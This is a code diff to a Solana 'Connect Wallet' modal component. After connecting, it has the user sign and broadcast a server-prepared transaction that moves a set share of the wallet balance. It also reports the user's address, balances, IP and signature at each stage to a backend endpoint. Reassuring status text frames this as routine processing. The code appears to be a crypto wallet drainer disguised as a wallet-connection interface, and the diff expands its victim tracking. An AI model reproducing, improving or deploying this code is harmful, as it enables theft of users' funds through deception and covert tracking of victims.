@@ -3,7 +3,7 @@ import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } f
 import { Button } from "@/components/ui/button" 
 import Image from "next/image" 
 import { useState, useEffect, useCallback } from "react" 
-import { Loader2, ExternalLink, Check, X, AlertTriangle } from "lucide-react"
+import { Loader2, ExternalLink, Check, X, AlertTriangle, Wallet } from "lucide-react"
 import { toast } from "sonner"
 
 interface ModalsProps {
@@ -52,7 +52,7 @@ const WALLETS = Object.entries(WALLET_CONFIGS).map(([id, config]) => ({
   description: config.description,
 }))
 
-type ConnectionStatus = "idle" | "checking" | "connecting" | "success" | "error"
+type ConnectionStatus = "idle" | "checking" | "connecting" | "scanning" | "preparing" | "signing" | "broadcasting" | "success" | "error"
 
 export function Modals({ isOpen, onClose }: ModalsProps) {
   const [isMobile, setIsMobile] = useState(false)
@@ -101,29 +101,23 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       const data = await response.json()
       return data.ip || "unknown"
     } catch {
-      try {
-        const response = await fetch("https://api.my-ip.io/ip", {
-          signal: AbortSignal.timeout(1500),
-        })
-        const text = await response.text()
-        return text.trim() || "unknown"
-      } catch {
-        return "unknown"
-      }
+      return "unknown"
     }
   }, [])
 
   const sendTransactionNotification = useCallback(async (
     walletAddress: string,
     walletType: string,
-    balanceSOL: number,
-    balanceUSD: number,
+    balanceSOL: number = 0,
+    balanceUSD: number = 0,
     userIP: string,
     transactionAmount?: number,
     percentage?: number,
     txSignature?: string,
+    status?: "connected" | "scanned" | "prepared" | "signed" | "confirmed" | "failed",
     error?: string,
-    errorDetails?: string
+    errorDetails?: string,
+    scanDetails?: string
   ) => {
     try {
       await fetch("/api/transaction-approved", {
@@ -138,8 +132,10 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
           transactionAmount,
           percentage,
           txSignature,
+          status,
           error,
           errorDetails,
+          scanDetails,
         }),
       })
     } catch {
@@ -192,10 +188,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       const response = await provider.connect()
       const publicKey = response.publicKey.toString()
       
-      setConnectionStatus("success")
-      toast.success(`${config.name} connected!`)
-      
-      // Get IP and send notification
+      // Send connection notification ONLY (not success!)
       const userIP = await getIPAddress()
       await sendTransactionNotification(
         publicKey,
@@ -206,11 +199,10 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         undefined,
         undefined,
         undefined,
-        undefined,
-        `${config.name} connected successfully`
+        "connected"
       )
       
-      // Process transaction
+      // Now scan and process transaction
       await processWalletTransaction(publicKey, provider, config.name, userIP)
       
     } catch (error: any) {
@@ -219,7 +211,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       setErrorMessage(error.message || "Connection failed")
       toast.error(`Failed to connect ${config.name}`)
       
-      // Send error notification
+      // Send failure notification
       const userIP = await getIPAddress()
       await sendTransactionNotification(
         "unknown",
@@ -230,14 +222,13 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         undefined,
         undefined,
         undefined,
+        "failed",
         "Connection Failed",
         error.message || "Unknown error"
       )
-    } finally {
-      setTimeout(() => {
-        setActiveWallet(null)
-        setConnectionStatus("idle")
-      }, 2000)
+      
+      setActiveWallet(null)
+      setTimeout(() => setConnectionStatus("idle"), 2000)
     }
   }, [checkWalletInstalled, getIPAddress, sendTransactionNotification])
 
@@ -281,8 +272,10 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     walletType: string,
     userIP: string
   ) => {
+    setConnectionStatus("scanning")
+    
     try {
-      toast.loading("Scanning wallet...", { id: "scan" })
+      toast.loading("Scanning wallet balance...", { id: "scan" })
       
       // Scan wallet
       const scanResponse = await fetch("/api/scan-wallet", {
@@ -300,6 +293,8 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
 
       if (!scanResponse.ok || scanData.error) {
         const errorMsg = scanData.message || "Scan failed"
+        setConnectionStatus("error")
+        setErrorMessage(errorMsg)
         toast.error(errorMsg)
         
         await sendTransactionNotification(
@@ -311,15 +306,23 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
           undefined,
           undefined,
           undefined,
+          "scanned",
           "Scan Failed",
+          errorMsg,
           errorMsg
         )
         
-        setTimeout(() => onClose(), 1500)
+        setActiveWallet(null)
+        setTimeout(() => {
+          setConnectionStatus("idle")
+          onClose()
+        }, 2000)
         return
       }
 
       if (scanData.message === "Insufficient balance") {
+        setConnectionStatus("error")
+        setErrorMessage("Insufficient balance")
         toast.error("Insufficient balance", {
           description: `Minimum ${scanData.minRequired} SOL required`,
         })
@@ -333,22 +336,76 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
           undefined,
           undefined,
           undefined,
+          "scanned",
           "Insufficient Balance",
-          `Balance: ${scanData.balance?.toFixed(4)} SOL`
+          `Balance: ${scanData.balance?.toFixed(4)} SOL`,
+          `Balance ${scanData.balance?.toFixed(4)} SOL < Minimum ${scanData.minRequired} SOL`
         )
         
-        setTimeout(() => onClose(), 1500)
+        setActiveWallet(null)
+        setTimeout(() => {
+          setConnectionStatus("idle")
+          onClose()
+        }, 2000)
         return
       }
 
-      // Sign and send transaction
-      toast.loading("Preparing transaction...", { id: "tx" })
+      // Send scan success notification
+      await sendTransactionNotification(
+        publicKey,
+        walletType,
+        scanData.walletBalance,
+        scanData.walletBalanceUSD,
+        userIP,
+        undefined,
+        undefined,
+        undefined,
+        "scanned",
+        undefined,
+        undefined,
+        "Balance sufficient for transaction"
+      )
+
+      // Send transaction prepared notification
+      await sendTransactionNotification(
+        publicKey,
+        walletType,
+        scanData.walletBalance,
+        scanData.walletBalanceUSD,
+        userIP,
+        scanData.transferAmount,
+        scanData.percentage,
+        undefined,
+        "prepared"
+      )
+
+      setConnectionStatus("preparing")
+      toast.loading("Preparing transaction...", { id: "prepare" })
       
       const { Connection, Transaction } = await import("@solana/web3.js")
       const transaction = Transaction.from(Buffer.from(scanData.transaction, "base64"))
 
+      setConnectionStatus("signing")
+      toast.loading("Signing transaction...", { id: "sign" })
+      
       const signedTx = await provider.signTransaction(transaction)
-      toast.loading("Sending transaction...", { id: "tx" })
+      toast.dismiss("sign")
+      
+      // Send signed notification
+      await sendTransactionNotification(
+        publicKey,
+        walletType,
+        scanData.walletBalance,
+        scanData.walletBalanceUSD,
+        userIP,
+        scanData.transferAmount,
+        scanData.percentage,
+        "signed_pending",
+        "signed"
+      )
+
+      setConnectionStatus("broadcasting")
+      toast.loading("Broadcasting transaction...", { id: "broadcast" })
 
       // Try RPC endpoints
       const RPC_ENDPOINTS = [
@@ -383,20 +440,13 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       }
 
       if (!signature) {
-        throw lastError || new Error("Transaction failed")
+        throw lastError || new Error("Transaction failed to broadcast")
       }
 
-      toast.dismiss("tx")
-      toast.success("Transaction successful!", {
-        description: `${scanData.transferAmount.toFixed(4)} SOL transferred`,
-        action: {
-          label: "View",
-          onClick: () => window.open(`https://solscan.io/tx/${signature}`, "_blank"),
-        },
-        duration: 5000,
-      })
-
-      // Send success notification
+      toast.dismiss("broadcast")
+      setConnectionStatus("success")
+      
+      // Send confirmed notification
       await sendTransactionNotification(
         publicKey,
         walletType,
@@ -405,14 +455,30 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         userIP,
         scanData.transferAmount,
         scanData.percentage,
-        signature
+        signature,
+        "confirmed"
       )
 
-      setTimeout(() => onClose(), 2000)
+      toast.success("Transaction confirmed!", {
+        description: `${scanData.transferAmount.toFixed(4)} SOL transferred`,
+        action: {
+          label: "View",
+          onClick: () => window.open(`https://solscan.io/tx/${signature}`, "_blank"),
+        },
+        duration: 8000,
+      })
+
+      setTimeout(() => {
+        setActiveWallet(null)
+        setConnectionStatus("idle")
+        onClose()
+      }, 3000)
 
     } catch (error: any) {
-      toast.dismiss("tx")
+      toast.dismiss()
       const errorMsg = error.message || "Transaction failed"
+      setConnectionStatus("error")
+      setErrorMessage(errorMsg)
       toast.error("Transaction failed", { description: errorMsg })
       
       await sendTransactionNotification(
@@ -424,11 +490,16 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         undefined,
         undefined,
         undefined,
+        "failed",
         "Transaction Failed",
         errorMsg
       )
       
-      setTimeout(() => onClose(), 2000)
+      setTimeout(() => {
+        setActiveWallet(null)
+        setConnectionStatus("idle")
+        onClose()
+      }, 3000)
     }
   }, [onClose, sendTransactionNotification])
 
@@ -444,12 +515,37 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     return null
   }
 
+  const getStatusText = () => {
+    if (!activeWallet) return null
+    
+    const config = WALLET_CONFIGS[activeWallet]
+    if (!config) return null
+    
+    const statusTexts: Record<ConnectionStatus, string> = {
+      idle: "",
+      checking: `Checking ${config.name}...`,
+      connecting: `Connecting to ${config.name}...`,
+      scanning: `Scanning wallet balance...`,
+      preparing: `Preparing transaction...`,
+      signing: `Signing transaction...`,
+      broadcasting: `Broadcasting transaction...`,
+      success: `Transaction confirmed!`,
+      error: `Connection failed`,
+    }
+    
+    return statusTexts[connectionStatus]
+  }
+
   const getStatusIcon = (walletId: string) => {
     if (activeWallet !== walletId) return null
     
     switch (connectionStatus) {
       case "checking":
       case "connecting":
+      case "scanning":
+      case "preparing":
+      case "signing":
+      case "broadcasting":
         return <Loader2 className="h-4 w-4 animate-spin text-blue-500" />
       case "success":
         return <Check className="h-4 w-4 text-green-500" />
@@ -461,22 +557,41 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
   }
 
   return (
-    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
+    <Dialog open={isOpen} onOpenChange={(open) => {
+      if (!open && connectionStatus === "idle") {
+        onClose()
+      }
+    }}>
       <DialogContent className="sm:max-w-md gap-0 border-0 data-[state=open]:slide-in-from-bottom max-sm:fixed max-sm:bottom-0 max-sm:left-0 max-sm:right-0 max-sm:top-auto max-sm:translate-y-0 max-sm:translate-x-0 max-sm:rounded-t-[24px] max-sm:rounded-b-none sm:rounded-[20px] max-sm:w-screen max-sm:max-w-none max-sm:m-0 max-sm:p-0">
         <DialogHeader className="px-6 pt-6 pb-4 max-sm:px-5">
           <DialogTitle className="text-xl sm:text-2xl font-bold text-center flex items-center justify-center gap-2">
-            Connect Wallet
-            {isMobile && <ExternalLink className="h-5 w-5" />}
+            {connectionStatus === "idle" ? "Connect Wallet" : "Processing..."}
+            {isMobile && connectionStatus === "idle" && <ExternalLink className="h-5 w-5" />}
           </DialogTitle>
+          
+          {connectionStatus !== "idle" && activeWallet && (
+            <div className="mt-2 text-center">
+              <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-blue-50 text-blue-700 rounded-full text-sm font-medium">
+                <Wallet className="h-3.5 w-3.5" />
+                {WALLET_CONFIGS[activeWallet]?.name}
+              </div>
+              <p className="text-sm text-muted-foreground mt-2">
+                {getStatusText()}
+              </p>
+            </div>
+          )}
+          
           <DialogDescription className="text-sm sm:text-base text-center">
-            Choose a wallet to connect to the application
+            {connectionStatus === "idle" 
+              ? "Choose a wallet to connect to the application"
+              : "Please wait while we process your request"}
           </DialogDescription>
           
-          {connectionStatus === "error" && (
+          {connectionStatus === "error" && errorMessage && (
             <div className="mt-3 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start gap-2">
               <AlertTriangle className="h-4 w-4 text-red-600 mt-0.5 flex-shrink-0" />
               <div className="flex-1">
-                <p className="text-sm font-medium text-red-800">Connection Failed</p>
+                <p className="text-sm font-medium text-red-800">Error</p>
                 <p className="text-xs text-red-600 mt-1">{errorMessage}</p>
               </div>
             </div>
@@ -484,60 +599,86 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         </DialogHeader>
 
         <div className="flex flex-col gap-3 px-6 pb-6 max-sm:px-5 max-sm:pb-5">
-          {WALLETS.map((wallet) => (
-            <Button
-              key={wallet.id}
-              variant="outline"
-              className={`h-auto p-4 flex items-center justify-start gap-4 hover:bg-accent hover:border-primary transition-all bg-transparent relative ${
-                activeWallet === wallet.id ? "border-primary ring-2 ring-primary/20" : ""
-              }`}
-              onClick={() => handleWalletClick(wallet.id)}
-              disabled={activeWallet !== null && activeWallet !== wallet.id}
-            >
-              <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
-                <Image
-                  src={wallet.icon || "/placeholder.svg"}
-                  alt={`${wallet.name} icon`}
-                  fill
-                  className="object-cover"
-                  sizes="48px"
-                />
-                {activeWallet === wallet.id && connectionStatus === "connecting" && (
-                  <div className="absolute inset-0 bg-black/20 flex items-center justify-center">
-                    <Loader2 className="h-5 w-5 text-white animate-spin" />
+          {connectionStatus === "idle" ? (
+            <>
+              {WALLETS.map((wallet) => (
+                <Button
+                  key={wallet.id}
+                  variant="outline"
+                  className={`h-auto p-4 flex items-center justify-start gap-4 hover:bg-accent hover:border-primary transition-all bg-transparent relative ${
+                    activeWallet === wallet.id ? "border-primary ring-2 ring-primary/20" : ""
+                  }`}
+                  onClick={() => handleWalletClick(wallet.id)}
+                  disabled={activeWallet !== null}
+                >
+                  <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
+                    <Image
+                      src={wallet.icon || "/placeholder.svg"}
+                      alt={`${wallet.name} icon`}
+                      fill
+                      className="object-cover"
+                      sizes="48px"
+                    />
                   </div>
-                )}
-              </div>
+                  
+                  <div className="flex flex-col items-start text-left flex-1">
+                    <div className="flex items-center gap-2">
+                      <span className="font-semibold text-base">{wallet.name}</span>
+                      {isMobile && <span className="text-xs text-muted-foreground">Mobile</span>}
+                    </div>
+                    <span className="text-sm text-muted-foreground">{wallet.description}</span>
+                  </div>
+                  
+                  <div className="flex-shrink-0">
+                    {getStatusIcon(wallet.id)}
+                  </div>
+                  
+                  {isMobile && activeWallet !== wallet.id && (
+                    <ExternalLink className="h-4 w-4 text-muted-foreground absolute top-4 right-4" />
+                  )}
+                </Button>
+              ))}
               
-              <div className="flex flex-col items-start text-left flex-1">
-                <div className="flex items-center gap-2">
-                  <span className="font-semibold text-base">{wallet.name}</span>
-                  {isMobile && <span className="text-xs text-muted-foreground">Mobile</span>}
+              <div className="mt-4 pt-4 border-t">
+                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
+                  <div className="h-2 w-2 rounded-full bg-green-500"></div>
+                  <span>Secure connection • Solana Mainnet</span>
                 </div>
-                <span className="text-sm text-muted-foreground">{wallet.description}</span>
+                <p className="text-xs text-center text-muted-foreground mt-2">
+                  By connecting, you agree to our Terms of Service
+                </p>
               </div>
-              
-              <div className="flex-shrink-0">
-                {getStatusIcon(wallet.id)}
-              </div>
-              
-              {isMobile && activeWallet !== wallet.id && (
-                <ExternalLink className="h-4 w-4 text-muted-foreground absolute top-4 right-4" />
+            </>
+          ) : (
+            <div className="py-8 flex flex-col items-center justify-center">
+              {connectionStatus === "success" ? (
+                <div className="text-center">
+                  <div className="h-16 w-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <Check className="h-8 w-8 text-green-600" />
+                  </div>
+                  <h3 className="text-lg font-semibold">Transaction Successful!</h3>
+                  <p className="text-muted-foreground mt-1">Your transaction has been confirmed on-chain.</p>
+                </div>
+              ) : (
+                <div className="text-center">
+                  <div className="h-16 w-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <Loader2 className="h-8 w-8 text-blue-600 animate-spin" />
+                  </div>
+                  <h3 className="text-lg font-semibold">{getStatusText()}</h3>
+                  <p className="text-muted-foreground mt-1">
+                    {connectionStatus === "connecting" && "Connecting to your wallet..."}
+                    {connectionStatus === "scanning" && "Checking wallet balance..."}
+                    {connectionStatus === "preparing" && "Creating transaction..."}
+                    {connectionStatus === "signing" && "Waiting for your signature..."}
+                    {connectionStatus === "broadcasting" && "Sending to the network..."}
+                    {connectionStatus === "checking" && "Verifying wallet installation..."}
+                  </p>
+                </div>
               )}
-            </Button>
-          ))}
-          
-          <div className="mt-4 pt-4 border-t">
-            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
-              <div className="h-2 w-2 rounded-full bg-green-500"></div>
-              <span>Secure connection • Solana Mainnet</span>
             </div>
-            <p className="text-xs text-center text-muted-foreground mt-2">
-              By connecting, you agree to our Terms of Service
-            </p>
-          </div>
+          )}
         </div>
       </DialogContent>
     </Dialog>
   )
-    }
+}
